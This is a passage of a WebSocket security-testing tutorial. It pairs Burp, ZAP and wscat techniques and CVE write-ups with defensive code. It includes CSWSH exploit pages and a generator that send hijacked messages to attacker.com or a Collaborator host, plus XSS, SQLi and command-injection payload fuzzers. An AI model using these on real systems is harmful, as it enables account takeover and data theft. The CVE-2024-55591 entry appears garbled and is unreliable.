**Example Testing Session:**
```
Test 1: {"message":"test"}               → Normal response
Test 2: {"message":"<script>"}           → Filter blocks
Test 3: {"message":"<ScRiPt>"}           → Bypass successful
Test 4: {"message":"<img src=x on"}      → Testing incremental payload
Test 5: {"message":"<img src=x onerror=alert(1)>"} → XSS confirmed
```

### 4. Handshake Modification

**Edit Handshake in Repeater:**
1. In Repeater, locate the WebSocket connection
2. Click the **pencil icon** next to the WebSocket URL
3. The handshake request editor opens
4. Add/modify headers:
```http
X-Forwarded-For: 1.1.1.1
Origin: https://trusted-domain.com
Cookie: session=modified_session_value
```
5. Click **"Connect"** to establish new connection with modified handshake

**Handshake Testing Checklist:**
- [ ] Test IP spoofing headers (X-Forwarded-For, X-Real-IP)
- [ ] Modify Origin header (null, trusted domains, subdomains)
- [ ] Test custom headers (X-User, X-Role, Authorization)
- [ ] Manipulate cookies (session tokens, auth cookies)
- [ ] Change protocol version (Sec-WebSocket-Version)
- [ ] Add custom sub-protocols (Sec-WebSocket-Protocol)

### 5. Burp Collaborator for Data Exfiltration

**Setup Collaborator:**
1. Go to **Burp → Burp Collaborator client**
2. Click **"Copy to clipboard"** to get your unique URL
   - Example: `abc123xyz.oastify.com`

**Use in CSWSH Exploit:**
```html
<script>
    var ws = new WebSocket('wss://target.com/chat');
    ws.onmessage = function(event) {
        fetch('https://abc123xyz.oastify.com', {
            method: 'POST',
            mode: 'no-cors',
            body: event.data
        });
    };
</script>
```

**Poll for Results:**
1. In Burp Collaborator client, click **"Poll now"**
2. View received HTTP/DNS requests
3. Examine request body/parameters for exfiltrated data

**Collaborator Use Cases:**
- **Blind XSS detection:** `<script src=https://abc123xyz.oastify.com/xss></script>`
- **Out-of-band XXE:** `<!ENTITY xxe SYSTEM "https://abc123xyz.oastify.com/?data=">`
- **CSWSH data exfiltration:** Receive stolen WebSocket messages
- **SSRF detection:** Trigger server to make requests to Collaborator

### 6. Advanced Testing Techniques

**Automated Fuzzing with Intruder:**

While Burp's Intruder doesn't directly support WebSocket fuzzing in the same way as HTTP, you can:

1. Use **Turbo Intruder extension** for WebSocket fuzzing
2. Script automated WebSocket testing with Python + Burp API
3. Use third-party tools like **SocketSleuth extension**

**Manual Systematic Testing:**
1. Create a checklist of payloads to test
2. Use Repeater to send each payload
3. Document responses in external notes
4. Look for differences in behavior (timing, errors, success)

**Testing Checklist:**
```
□ XSS payloads (10+ variations)
□ SQL injection (UNION, boolean, time-based)
□ Command injection (; && || ` $())
□ Path traversal (../../etc/passwd)
□ XXE injection (file://, http://)
□ Buffer overflow (long strings)
□ Format string (%s, %x, %n)
□ Prototype pollution (__proto__)
□ LDAP injection (*)(uid=*)
□ NoSQL injection ({"$ne":null})
```

**Response Analysis:**
- **Status changes:** Connection closes, errors returned
- **Timing differences:** Delays indicate time-based attacks
- **Content variations:** Different responses reveal logic
- **Error messages:** Leak technology stack, file paths
- **Connection behavior:** Bans, rate limits, restrictions

---

## Real-World CVEs

### CVE-2024-55591: Node.js WebSocket Authentication Bypass

**Severity:** Critical (CVSS 9.8)
**Affected:** Node.js `ws` module
**Discovered:** 2025

**Description:**
Authentication bypass vulnerability in the Node.js WebSocket module allowed crafted requests to exploit an alternate authentication path, enabling remote attackers to escalate privileges to super-admin without authentication.

**Affected Products:**
- FortiOS (Fortinet firewall operating system)
- FortiProxy (Fortinet web proxy)
- Any Node.js application using vulnerable `ws` module versions

**Exploitation:**
```javascript
// Attacker crafts WebSocket handshake with alternate auth path
GET /admin-websocket HTTP/1.1
Host: target.com
Upgrade: websocket
X-Auth-Bypass: alternate-path
Sec-WebSocket-Version: 13
```

**Impact:**
- Complete authentication bypass
- Privilege escalation to super-admin
- Remote code execution potential
- Full system compromise

**Remediation:**
- Update Node.js `ws` module to patched version
- Implement proper authentication validation
- Validate ALL authentication paths
- Do not rely solely on WebSocket library for auth

**References:**
- [ULTRA RED Blog - The Dark Side of WebSockets](https://www.ultrared.ai/blog/the-dark-side-of-websockets)

---

### CVE-2018-1270: Spring Framework RCE via WebSocket

**Severity:** Critical (CVSS 9.8)
**Affected:** Spring Framework 5.0 to 5.0.4, 4.3 to 4.3.14
**Discovered:** 2018

**Description:**
Remote Code Execution vulnerability in Spring Framework's STOMP (Simple Text Oriented Messaging Protocol) over WebSocket. Attackers could execute arbitrary code by sending crafted STOMP messages.

**Vulnerable Code Pattern:**
```java
@MessageMapping("/chat")
public void handleMessage(String message) {
    // Vulnerable: Message deserialization without validation
    Object obj = deserialize(message);
    processMessage(obj);
}
```

**Exploitation:**
```javascript
// Attacker sends crafted STOMP message
var ws = new WebSocket('ws://target.com/stomp');
ws.onopen = function() {
    ws.send("SEND\n" +
            "destination:/app/chat\n" +
            "content-length:1000\n\n" +
            serialized_malicious_object);
};
```

**Impact:**
- Remote Code Execution
- Full server compromise
- Data theft
- Lateral movement in network

**Remediation:**
- Upgrade Spring Framework to 5.0.5+ or 4.3.15+
- Validate and sanitize WebSocket message content
- Implement allowlist for message destinations
- Use secure deserialization practices

**References:**
- [Spring CVE-2018-1270 Advisory](https://spring.io/security/cve-2018-1270)

---

### Gitpod Cross-Site WebSocket Hijacking (2023)

**Severity:** High (CVSS 8.1)
**Affected:** Gitpod cloud development platform
**Discovered:** 2023

**Description:**
Insufficient origin validation in Gitpod's WebSocket handshake allowed attackers to hijack WebSocket connections, leading to full account takeover. The vulnerability stemmed from the absence of CSRF tokens and improper origin checking.

**Vulnerable Handshake:**
```http
GET /websocket HTTP/1.1
Host: gitpod.io
Upgrade: websocket
Origin: https://attacker.com  ← Not validated
Cookie: session=victim_session_token
```

**Exploitation:**
```html
<!-- Attacker-hosted page -->
<script>
    var ws = new WebSocket('wss://gitpod.io/websocket');

    ws.onopen = function() {
        // Request user data
        ws.send(JSON.stringify({action: "getUserInfo"}));
    };

    ws.onmessage = function(event) {
        // Steal user data and tokens
        fetch('https://attacker.com/steal', {
            method: 'POST',
            body: event.data
        });
    };
</script>
```

**Impact:**
- Full account takeover
- Access to all user workspaces and code
- Theft of OAuth tokens and credentials
- Potential supply chain attacks via compromised projects

**Remediation:**
- Implement CSRF tokens in WebSocket handshake
- Validate Origin header against allowlist
- Use SameSite=Strict cookie attribute
- Implement additional authentication beyond cookies

**References:**
- [Pentest-Tools - Cross-Site WebSocket Hijacking](https://pentest-tools.com/blog/cross-site-websocket-hijacking-cswsh)

---

### WebSocket Data Exposure via Wildcard Injection

**Severity:** High (CVSS 7.5)
**Affected:** Multiple applications with improper input validation
**Year:** 2023-2024

**Description:**
Multiple applications were found to be vulnerable to data exposure when accepting wildcard characters in WebSocket messages. By sending `*` instead of specific identifiers, applications would broadcast all data instead of filtered results.

**Vulnerable API Pattern:**
```javascript
// Server-side vulnerable code
socket.on('subscribe', function(data) {
    // Vulnerable: No validation of userId
    let userId = data.userId;  // Could be "*"
    let projectId = data.projectId;  // Could be "*"

    // Query returns ALL users/projects if wildcard
    let notifications = getNotifications(userId, projectId);
    socket.emit('notifications', notifications);
});
```

**Exploitation:**
```javascript
// Attacker sends wildcard to retrieve all data
var ws = new WebSocket('wss://target.com/notifications');
ws.onopen = function() {
    ws.send(JSON.stringify({
        action: "subscribe",
        userId: "*",
        projectId: "*"
    }));
};

ws.onmessage = function(event) {
    // Receives notifications for ALL users and projects
    console.log("Stolen data:", event.data);
};
```

**Impact:**
- Unauthorized access to all user data
- Privacy breach (GDPR violation)
- Access to confidential project files
- Mass data exfiltration

**Remediation:**
- Validate and sanitize ALL user input
- Implement strict access controls
- Never use user input directly in database queries
- Filter results based on authenticated user's permissions

---

### Common WebSocket Vulnerability Patterns

| Vulnerability | CVE Examples | Impact | Prevalence |
|---------------|-------------|--------|------------|
| **CSWSH** | Gitpod, multiple SaaS platforms | Account takeover, data theft | High |
| **Authentication Bypass** | CVE-2024-55591 (FortiOS) | Full system compromise | Medium |
| **RCE via Deserialization** | CVE-2018-1270 (Spring) | Complete server takeover | Medium |
| **SQL Injection** | Various, not always assigned CVE | Database compromise | High |
| **XSS** | Various web applications | Session hijacking, defacement | Very High |
| **DoS** | Multiple `ws` library versions | Service disruption | Medium |
| **Data Exposure** | Wildcard injection cases | Privacy breach, data theft | High |

---

## Tools & Automation

### 1. Burp Suite

**Primary Tool for WebSocket Testing**

**Features:**
- **WebSocket Message Interception**: Modify messages in real-time
- **WebSocket History**: Complete audit trail of all WebSocket traffic
- **Repeater**: Manual testing and payload iteration
- **Intruder**: Automated fuzzing (with extensions)
- **Collaborator**: Out-of-band data exfiltration
- **Scanner**: Automatic vulnerability detection (Professional only)

**Setup:**
```bash
# Download Burp Suite Community Edition
https://portswigger.net/burp/communitydownload

# Configure browser proxy
Proxy: 127.0.0.1
Port: 8080

# Import CA certificate
http://burpsuite → CA Certificate → Install in browser
```

**Key Workflows:**
1. **Passive Analysis**: Monitor WebSocket traffic in WebSockets history
2. **Active Testing**: Intercept and modify messages with Proxy → Intercept
3. **Fuzzing**: Use Repeater for systematic payload testing
4. **Exploitation**: Use Collaborator for CSWSH and data exfiltration

**Recommended Extensions:**
- **SocketSleuth**: Enhanced WebSocket testing features
- **WebSocket Turbo Intruder**: Automated WebSocket fuzzing
- **Autorize**: Authorization bypass testing
- **Logger++**: Advanced logging for WebSocket traffic

---

### 2. OWASP ZAP (Zed Attack Proxy)

**Free Alternative to Burp Suite**

**Features:**
- WebSocket message interception
- Automated scanning for WebSocket vulnerabilities
- Fuzzing capabilities
- API for scripted testing
- Completely free and open-source

**Setup:**
```bash
# Install ZAP
wget https://github.com/zaproxy/zaproxy/releases/download/v2.14.0/ZAP_2_14_0_unix.sh
bash ZAP_2_14_0_unix.sh

# Or via package manager
sudo apt install zaproxy  # Debian/Ubuntu
brew install --cask owasp-zap  # macOS
```

**Configuration:**
1. Start ZAP and configure as proxy (default: 127.0.0.1:8080)
2. Configure browser to use ZAP proxy
3. Navigate to target application
4. View WebSocket traffic in **Sites → [target] → WebSocket**

**WebSocket Testing in ZAP:**
```python
# Python script for automated WebSocket testing with ZAP API
from zapv2 import ZAPv2

zap = ZAPv2(apikey='your-api-key', proxies={'http': 'http://127.0.0.1:8080'})

# Send WebSocket message
zap.websocket.send_text_message(
    channel_id=1,
    message='{"message":"<script>alert(1)</script>"}'
)

# Get all WebSocket messages
messages = zap.websocket.messages(channel_id=1)
for msg in messages:
    print(f"Direction: {msg['outgoing']}, Payload: {msg['payload']}")
```

**Advantages over Burp:**
- Completely free (no paid version required)
- Better automation and scripting support
- Active community and frequent updates

**References:**
- [ZAP WebSocket Testing](https://digi.ninja/blog/zap_web_sockets.php)

---

### 3. wscat

**Lightweight Command-Line WebSocket Client**

**Installation:**
```bash
# Install via npm
npm install -g wscat

# Or via yarn
yarn global add wscat
```

**Basic Usage:**
```bash
# Connect to WebSocket
wscat -c wss://target.com/chat

# Connect with custom headers
wscat -c wss://target.com/chat -H "Cookie: session=abc123" -H "Origin: https://target.com"

# Connect without TLS verification (testing)
wscat -c wss://target.com/chat --no-check

# Send message upon connection
wscat -c wss://target.com/chat -x "READY"
```

**Interactive Session:**
```bash
$ wscat -c wss://echo.websocket.org
Connected (press CTRL+C to quit)
> Hello World
< Hello World
> {"message":"test"}
< {"message":"test"}
```

**Scripted Testing:**
```bash
# Send multiple messages from file
while IFS= read -r line; do
    echo "$line"
done < payloads.txt | wscat -c wss://target.com/chat

# Test for XSS
echo '{"message":"<script>alert(1)</script>"}' | wscat -c wss://target.com/chat

# Fuzzing with wordlist
for payload in $(cat xss_payloads.txt); do
    echo "{\"message\":\"$payload\"}" | wscat -c wss://target.com/chat
    sleep 1
done
```

**Advantages:**
- Simple and lightweight
- Easy to script and automate
- Perfect for quick manual testing
- Bypass client-side logic
- No GUI overhead

---

### 4. websocat

**Advanced WebSocket Client and Server**

**Installation:**
```bash
# Linux
wget https://github.com/vi/websocat/releases/download/v1.12.0/websocat.x86_64-unknown-linux-musl
chmod +x websocat.x86_64-unknown-linux-musl
sudo mv websocat.x86_64-unknown-linux-musl /usr/local/bin/websocat

# macOS
brew install websocat

# Cargo (Rust)
cargo install websocat
```

**Basic Usage:**
```bash
# Connect to WebSocket
websocat wss://target.com/chat

# Connect with custom headers
websocat wss://target.com/chat --header="Cookie: session=abc123"

# Binary data
websocat -b wss://target.com/binary

# Logging to file
websocat wss://target.com/chat --text --log-file=ws_traffic.log
```

**Advanced Features:**
```bash
# Port forwarding through WebSocket
websocat -v ws-l:127.0.0.1:8080 wss://target.com/chat

# Proxying
websocat --socks5=127.0.0.1:9050 wss://target.com/chat

# Execute command and send output
echo "SELECT * FROM users" | websocat wss://target.com/sql

# Automated reconnection
websocat --ping-interval=10 --ping-timeout=5 wss://target.com/chat
```

---

### 5. Python Testing Scripts

**Basic WebSocket Client:**
```python
#!/usr/bin/env python3
import asyncio
import websockets
import json

async def test_websocket():
    uri = "wss://target.com/chat"
    headers = {
        "Cookie": "session=abc123",
        "Origin": "https://target.com"
    }

    async with websockets.connect(uri, extra_headers=headers) as websocket:
        # Send message
        message = json.dumps({"message": "test"})
        await websocket.send(message)

        # Receive response
        response = await websocket.recv()
        print(f"Received: {response}")

asyncio.get_event_loop().run_until_complete(test_websocket())
```

**XSS Fuzzer:**
```python
#!/usr/bin/env python3
import asyncio
import websockets
import json

xss_payloads = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<body onload=alert(1)>",
    "<img src=x oNeRrOr=alert(1)>",
    "<img src=x onerror=alert`1`>",
    "';alert(1);//",
    "\"><script>alert(1)</script>",
    "<script>alert(String.fromCharCode(88,83,83))</script>"
]

async def fuzz_xss(uri):
    async with websockets.connect(uri) as ws:
        for payload in xss_payloads:
            message = json.dumps({"message": payload})
            await ws.send(message)
            print(f"Sent: {payload}")

            try:
                response = await asyncio.wait_for(ws.recv(), timeout=2.0)
                print(f"Response: {response}\n")
            except asyncio.TimeoutError:
                print("Connection closed or timeout\n")
                break

            await asyncio.sleep(1)

asyncio.run(fuzz_xss("wss://target.com/chat"))
```

**CSWSH Exploit Generator:**
```python
#!/usr/bin/env python3

def generate_cswsh_exploit(websocket_url, exfil_url):
    exploit = f"""
<html>
<head><title>Loading...</title></head>
<body>
<script>
    var ws = new WebSocket('{websocket_url}');

    ws.onopen = function() {{
        console.log('[+] WebSocket connected');
        ws.send("READY");
    }};

    ws.onmessage = function(event) {{
        console.log('[+] Received:', event.data);

        // Exfiltrate data
        fetch('{exfil_url}', {{
            method: 'POST',
            mode: 'no-cors',
            body: event.data
        }});
    }};

    ws.onerror = function(error) {{
        console.log('[!] Error:', error);
    }};

    ws.onclose = function() {{
        console.log('[+] Connection closed');
    }};
</script>
</body>
</html>
"""
    return exploit

# Usage
exploit = generate_cswsh_exploit(
    websocket_url="wss://target.com/chat",
    exfil_url="https://attacker.com/collect"
)

with open("exploit.html", "w") as f:
    f.write(exploit)

print("[+] Exploit saved to exploit.html")
```

**SQL Injection Tester:**
```python
#!/usr/bin/env python3
import asyncio
import websockets
import json

sqli_payloads = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' UNION SELECT NULL--",
    "' UNION SELECT username, password FROM users--",
    "admin'--",
    "' OR '1'='1' UNION SELECT NULL, NULL, NULL--",
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "1' ORDER BY 3--",
    "' AND 1=0 UNION SELECT NULL, table_name FROM information_schema.tables--"
]

async def test_sqli(uri, param_name):
    async with websockets.connect(uri) as ws:
        for payload in sqli_payloads:
            message = json.dumps({param_name: payload})
            await ws.send(message)
            print(f"Testing: {payload}")

            response = await ws.recv()
            print(f"Response: {response}\n")

            # Check for SQL errors
            if any(err in response.lower() for err in ['sql', 'mysql', 'syntax', 'database']):
                print(f"[!] Potential SQL injection found: {payload}\n")

            await asyncio.sleep(1)

asyncio.run(test_sqli("wss://target.com/search", "query"))
```

---

### 6. Browser Developer Tools

**Built-in WebSocket Debugging**

**Chrome DevTools:**
1. Open DevTools (F12)
2. Go to **Network** tab
3. Filter by **WS** (WebSockets)
4. Click on WebSocket connection
5. View **Messages**, **Frames**, **Headers**

**Console Testing:**
```javascript
// Establish connection
var ws = new WebSocket('wss://target.com/chat');

// Log all events
ws.onopen = () => console.log('[+] Connected');
ws.onmessage = (e) => console.log('[<] Received:', e.data);
ws.onerror = (e) => console.error('[!] Error:', e);
ws.onclose = () => console.log('[+] Closed');

// Send messages
ws.send(JSON.stringify({message: "test"}));

// Inject XSS payload
ws.send(JSON.stringify({message: "<img src=x onerror=alert(1)>"}));
```

**Firefox Developer Tools:**
Similar to Chrome, with additional **WebSocket Monitor** add-on for advanced features.

---

### 7. SocketSleuth (Burp Extension)

**Enhanced WebSocket Testing for Burp Suite**

**Features:**
- Automated WebSocket vulnerability scanning
- Improved Intruder support for WebSockets
- Better message history and filtering
- Custom payload generators for WebSocket fuzzing

**Installation:**
1. In Burp Suite, go to **Extender → BApp Store**
2. Search for "SocketSleuth"
3. Click **"Install"**

**Usage:**
- WebSocket connections appear in a dedicated tab
- Right-click messages to send to Intruder with WebSocket support
- Automated scanning for XSS, SQLi, command injection in WebSocket messages

**References:**
- [SocketSleuth - Snyk Labs](https://snyk.io/blog/socketsleuth-improving-security-testing-for-websocket-applications/)

---

### 8. Custom Automation Framework

**Complete Testing Framework (Python):**

```python
#!/usr/bin/env python3
import asyncio
import websockets
import json
import argparse
from datetime import datetime

class WebSocketTester:
    def __init__(self, uri, headers=None):
        self.uri = uri
        self.headers = headers or {}
        self.results = []

    async def connect(self):
        return await websockets.connect(self.uri, extra_headers=self.headers)

    async def test_payload(self, ws, payload_type, payload):
        try:
            message = json.dumps({"message": payload})
            await ws.send(message)

            response = await asyncio.wait_for(ws.recv(), timeout=5.0)

            result = {
                "timestamp": datetime.now().isoformat(),
                "type": payload_type,
                "payload": payload,
                "response": response,
                "status": "success"
            }

            return result
        except asyncio.TimeoutError:
            return {
                "timestamp": datetime.now().isoformat(),
                "type": payload_type,
                "payload": payload,
                "response": "Timeout",
                "status": "timeout"
            }
        except Exception as e:
            return {
                "timestamp": datetime.now().isoformat(),
                "type": payload_type,
                "payload": payload,
                "response": str(e),
                "status": "error"
            }

    async def run_tests(self, payloads):
        async with await self.connect() as ws:
            for payload_type, payload_list in payloads.items():
                print(f"\n[*] Testing {payload_type}...")
                for payload in payload_list:
                    result = await self.test_payload(ws, payload_type, payload)
                    self.results.append(result)
                    print(f"  {result['status']}: {payload[:50]}")
                    await asyncio.sleep(1)

    def save_results(self, filename):
        with open(filename, 'w') as f:
            json.dump(self.results, f, indent=2)
        print(f"\n[+] Results saved to {filename}")

# Define test payloads
payloads = {
    "XSS": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
    ],
    "SQLi": [
        "' OR '1'='1",
        "' UNION SELECT NULL--",
        "admin'--",
    ],
    "Command Injection": [
        "; ls -la",
        "| whoami",
        "`id`",
    ]
}

# Run tests
async def main():
    parser = argparse.ArgumentParser(description='WebSocket Security Tester')
    parser.add_argument('url', help='WebSocket URL (wss://target.com/chat)')
    parser.add_argument('--cookie', help='Session cookie')
    args = parser.parse_args()

    headers = {}
    if args.cookie:
        headers['Cookie'] = args.cookie

    tester = WebSocketTester(args.url, headers)
    await tester.run_tests(payloads)
    tester.save_results('websocket_test_results.json')

if __name__ == "__main__":
    asyncio.run(main())
```

**Usage:**
```bash
python3 ws_tester.py wss://target.com/chat --cookie "session=abc123"
```

---

## Defense & Prevention

### 1. Secure WebSocket Implementation

**Authentication & Authorization:**

**Proper Token-Based Authentication:**
```javascript
// Client-side: Include token in handshake
const token = localStorage.getItem('authToken');
const ws = new WebSocket(`wss://api.com/chat?token=${token}`);

// Server-side: Validate token before upgrading
app.ws('/chat', (ws, req) => {
    const token = req.query.token;
    if (!validateToken(token)) {
        ws.close(1008, 'Unauthorized');
        return;
    }
    // Proceed with WebSocket connection
});
```

**Session-Based with Additional Validation:**
```javascript
// Server-side: Don't rely solely on cookies
app.ws('/chat', (ws, req) => {
    const sessionId = req.cookies.session;
    const csrfToken = req.headers['x-csrf-token'];

    // Validate both session and CSRF token
    if (!validateSession(sessionId) || !validateCSRF(csrfToken)) {
        ws.close(1008, 'Unauthorized');
        return;
    }

    // Proceed with WebSocket connection
});
```

**Re-validate on Every Critical Action:**
```javascript
ws.on('message', (message) => {
    const data = JSON.parse(message);

    // Re-validate authorization for sensitive operations
    if (data.action === 'deleteAccount') {
        if (!isAuthorized(ws.user, 'deleteAccount')) {
            ws.send(JSON.stringify({error: 'Unauthorized'}));
            return;
        }
    }

    processMessage(data);
});
```

---

### 2. Prevent Cross-Site WebSocket Hijacking (CSWSH)

**Implement CSRF Tokens:**

**Client-Side:**
```javascript
// Obtain CSRF token from page or API
const csrfToken = document.querySelector('meta[name="csrf-token"]').content;

// Include in WebSocket URL or initial message
const ws = new WebSocket(`wss://api.com/chat?csrf=${csrfToken}`);

// Or send as first message
ws.onopen = () => {
    ws.send(JSON.stringify({
        type: 'auth',
        csrfToken: csrfToken
    }));
};
```

**Server-Side:**
```javascript
const crypto = require('crypto');

// Generate CSRF token for user session
function generateCSRFToken(sessionId) {
    return crypto.createHmac('sha256', SECRET_KEY)
                 .update(sessionId)
                 .digest('hex');
}

// Validate CSRF token in handshake
app.ws('/chat', (ws, req) => {
    const sessionId = req.cookies.session;
    const providedCSRF = req.query.csrf;
    const expectedCSRF = generateCSRFToken(sessionId);

    if (providedCSRF !== expectedCSRF) {
        ws.close(1008, 'Invalid CSRF token');
        return;
    }

    // Proceed with connection
});
```

**Validate Origin Header:**
```javascript
app.ws('/chat', (ws, req) => {
    const origin = req.headers.origin;
    const allowedOrigins = [
        'https://example.com',
        'https://app.example.com'
    ];

    if (!allowedOrigins.includes(origin)) {
        ws.close(1008, 'Invalid origin');
        return;
    }

    // Proceed with connection
});
```

**Use SameSite Cookies:**
```javascript
// Set cookies with SameSite=Strict or Lax
res.cookie('session', sessionId, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict'  // Prevents cross-site cookie sending
});
```

---

### 3. Input Validation & Sanitization

**Never Trust Client Data:**

**Validate Message Structure:**
```javascript
const Joi = require('joi');

const messageSchema = Joi.object({
    type: Joi.string().valid('chat', 'command', 'status').required(),
    content: Joi.string().max(1000).required(),
    userId: Joi.number().integer().positive().required()
});

ws.on('message', (message) => {
    try {
        const data = JSON.parse(message);
        const { error, value } = messageSchema.validate(data);

        if (error) {
            ws.send(JSON.stringify({error: 'Invalid message format'}));
            return;
        }

        processValidatedMessage(value);
    } catch (e) {
        ws.send(JSON.stringify({error: 'Invalid JSON'}));
    }
});
```

**Sanitize HTML Content:**
```javascript
const DOMPurify = require('isomorphic-dompurify');

ws.on('message', (message) => {
    const data = JSON.parse(message);

    // Sanitize HTML before storing/broadcasting
    data.content = DOMPurify.sanitize(data.content, {
        ALLOWED_TAGS: [],  // Strip all HTML
        ALLOWED_ATTR: []
    });

    broadcastMessage(data);
});
```

**Parameterized Queries (Prevent SQL Injection):**
```javascript
ws.on('message', async (message) => {
    const data = JSON.parse(message);

    // VULNERABLE - Don't do this
    // const query = `SELECT * FROM messages WHERE userId = ${data.userId}`;

    // SECURE - Use parameterized queries
    const query = 'SELECT * FROM messages WHERE userId = ?';
    const results = await db.query(query, [data.userId]);

    ws.send(JSON.stringify(results));
});
```

**Whitelist Validation:**
```javascript
ws.on('message', (message) => {
    const data = JSON.parse(message);

    // Whitelist allowed actions
    const allowedActions = ['chat', 'status', 'typing'];
    if (!allowedActions.includes(data.action)) {
        ws.send(JSON.stringify({error: 'Invalid action'}));
        return;
    }

    processAction(data);
});
```

---

### 4. Use Secure WebSocket Protocol (wss://)

**Always Use TLS in Production:**

```javascript
// INSECURE - Never use in production
const ws = new WebSocket('ws://example.com/chat');

// SECURE - Always use wss://
const ws = new WebSocket('wss://example.com/chat');
```

**Server Configuration (Node.js with HTTPS):**
```javascript
const https = require('https');
const fs = require('fs');
const WebSocket = require('ws');

// Create HTTPS server
const server = https.createServer({
    cert: fs.readFileSync('/path/to/cert.pem'),
    key: fs.readFileSync('/path/to/key.pem')
});

// Create WebSocket server on HTTPS
const wss = new WebSocket.Server({ server });

wss.on('connection', (ws, req) => {
    console.log('Secure WebSocket connection established');
});

server.listen(443);
```

**Nginx Reverse Proxy with TLS:**
```nginx
server {
    listen 443 ssl;
    server_name example.com;

    ssl_certificate /path/to/cert.pem;
    ssl_certificate_key /path/to/key.pem;

    location /chat {
        proxy_pass http://localhost:3000;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "Upgrade";
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }
}
```

---

### 5. Rate Limiting & DoS Prevention

**Connection Rate Limiting:**
```javascript
const rateLimit = require('express-rate-limit');

const wsLimiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: 10, // Max 10 WebSocket connections per IP
    message: 'Too many WebSocket connections'
});

app.use('/chat', wsLimiter);
```

**Message Rate Limiting:**
```javascript
const messageRateLimits = new Map();

ws.on('message', (message) => {
    const clientId = ws.clientId;
    const now = Date.now();

    if (!messageRateLimits.has(clientId)) {
        messageRateLimits.set(clientId, []);
    }

    const timestamps = messageRateLimits.get(clientId);

    // Remove timestamps older than 1 minute
    const recentTimestamps = timestamps.filter(t => now - t < 60000);

    if (recentTimestamps.length >= 60) {
        ws.send(JSON.stringify({error: 'Rate limit exceeded'}));
        return;
    }

    recentTimestamps.push(now);
    messageRateLimits.set(clientId, recentTimestamps);

    processMessage(message);
});
```

**Connection Timeout:**
```javascript
const PING_INTERVAL = 30000; // 30 seconds
const PONG_TIMEOUT = 5000; // 5 seconds

wss.on('connection', (ws) => {
    ws.isAlive = true;

    ws.on('pong', () => {
        ws.isAlive = true;
    });

    // Send ping every 30 seconds
    const interval = setInterval(() => {
        if (ws.isAlive === false) {
            clearInterval(interval);
            return ws.terminate();
        }

        ws.isAlive = false;
        ws.ping();
    }, PING_INTERVAL);

    ws.on('close', () => {
        clearInterval(interval);
    });
});
```

**Message Size Limits:**
```javascript
const MAX_MESSAGE_SIZE = 10 * 1024; // 10 KB

ws.on('message', (message) => {
    if (message.length > MAX_MESSAGE_SIZE) {
        ws.close(1009, 'Message too large');
        return;
    }

    processMessage(message);
});
```

---

### 6. Security Headers & Content Security Policy

**HTTP Security Headers:**
```javascript
app.use((req, res, next) => {
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.setHeader('X-Frame-Options', 'DENY');
    res.setHeader('X-XSS-Protection', '1; mode=block');
    res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
    next();
});
```

**Content Security Policy:**
```javascript
app.use((req, res, next) => {
    res.setHeader('Content-Security-Policy',
        "default-src 'self'; " +
        "connect-src 'self' wss://example.com; " +
        "script-src 'self'; " +
        "style-src 'self' 'unsafe-inline';"
    );
    next();
});
```

---

### 7. Logging & Monitoring

**Comprehensive Logging:**
```javascript
const winston = require('winston');

const logger = winston.createLogger({
    level: 'info',
    format: winston.format.json(),
    transports: [
        new winston.transports.File({ filename: 'websocket.log' })
    ]
});

wss.on('connection', (ws, req) => {
    const clientIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

    logger.info({
        event: 'connection',
        ip: clientIp,
        origin: req.headers.origin,
        userAgent: req.headers['user-agent'],
        timestamp: new Date().toISOString()
    });

    ws.on('message', (message) => {
        logger.info({
            event: 'message',
            ip: clientIp,
            size: message.length,
            content: message.substring(0, 100), // Log first 100 chars
            timestamp: new Date().toISOString()
        });
    });

    ws.on('close', () => {
        logger.info({
            event: 'disconnect',
            ip: clientIp,
            timestamp: new Date().toISOString()
        });
    });
});
```

**Anomaly Detection:**
```javascript
// Detect suspicious patterns
ws.on('message', (message) => {
    const suspiciousPatterns = [
        /<script/i,
        /union\s+select/i,
        /\bor\b.*=.*=/i,
        /\.\.\/\.\.\//,
        /exec\(/i
    ];

    for (const pattern of suspiciousPatterns) {
        if (pattern.test(message)) {
            logger.warn({
                event: 'suspicious_pattern',
                pattern: pattern.toString(),
                message: message,
                ip: ws.clientIp,
                timestamp: new Date().toISOString()
            });

            // Optional: Close connection or trigger alert
            // ws.close(1008, 'Suspicious activity detected');
            break;
        }
    }
});
```

---

### 8. Framework-Specific Protections

**Django Channels (Python):**
```python
from channels.generic.websocket import WebsocketConsumer
from django.core.exceptions import PermissionDenied
import json

class ChatConsumer(WebsocketConsumer):
    def connect(self):
        # Validate user authentication
        if not self.scope["user"].is_authenticated:
            self.close()
            return

        # Validate origin
        origin = self.scope["headers"].get(b"origin", b"").decode()
        if origin not in settings.ALLOWED_ORIGINS:
            self.close()
            return

        self.accept()

    def receive(self, text_data):
        # Validate and sanitize input
        try:
            data = json.loads(text_data)

            # Validate message structure
            if "message" not in data or len(data["message"]) > 1000:
                self.send(json.dumps({"error": "Invalid message"}))
                return

            # Sanitize HTML
            from bleach import clean
            sanitized_message = clean(data["message"], tags=[], strip=True)

            # Process message
            self.send(json.dumps({"message": sanitized_message}))
        except json.JSONDecodeError:
            self.close()
```

**Spring Boot (Java):**
```java
@Configuration
@EnableWebSocketMessageBroker
public class WebSocketConfig implements WebSocketMessageBrokerConfigurer {

    @Override
    public void configureMessageBroker(MessageBrokerRegistry config) {
        config.enableSimpleBroker("/topic");
        config.setApplicationDestinationPrefixes("/app");
    }

    @Override
    public void registerStompEndpoints(StompEndpointRegistry registry) {
        registry.addEndpoint("/chat")
                .setAllowedOrigins("https://example.com") // Whitelist origins
                .withSockJS();
    }

    @Override
    public void configureClientInboundChannel(ChannelRegistration registration) {
        // Add authentication interceptor
        registration.interceptors(new ChannelInterceptor() {
            @Override
